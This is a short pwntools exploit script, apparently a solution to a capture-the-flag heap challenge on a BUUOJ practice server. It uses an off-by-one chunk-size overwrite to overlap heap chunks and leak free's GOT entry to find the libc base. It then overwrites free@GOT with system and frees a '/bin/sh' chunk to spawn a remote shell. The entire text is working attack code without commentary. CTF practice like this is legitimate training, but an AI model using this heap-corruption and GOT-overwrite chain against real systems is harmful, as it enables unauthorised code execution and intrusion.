from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27074)
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

def alloc(size,content):
	sh.sendlineafter(b"choice :",b'1')
	sh.sendlineafter(b"Heap : ",str(size))
	sh.sendlineafter(b"heap:",content)
 
def edit(idx,content):
	sh.sendlineafter(b"choice :",b'2')
	sh.sendlineafter(b"Index :",str(idx))
	sh.sendlineafter(b"heap : ",content)
 
def show(idx):
	sh.sendlineafter(b"choice :",b'3')
	sh.sendlineafter(b"Index :",str(idx))
 
def free(idx):
	sh.sendlineafter(b"choice :",b'4')
	sh.sendlineafter(b"Index :",str(idx))

free_got=0x0000000000602018

alloc(0x18,b"aaaa")
alloc(0x10,b"aaaa")
alloc(0x10,b"aaaa")
alloc(0x10,b"/bin/sh\x00")
payload=0x18*b'a'+b"\x81"
edit(0,payload)
free(1)
alloc(0x70,b"aaaa")
payload=8*p64(0)+p64(8)+p64(free_got)
edit(1,payload)
show(2)
#gdb.attach(sh)
sh.recvuntil(b"Content : ")
free_addr=u64(sh.recv(6).ljust(8,b"\x00"))
libc_base=free_addr-libc.sym["free"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
edit(2,p64(system_addr))
free(3)
sh.interactive()
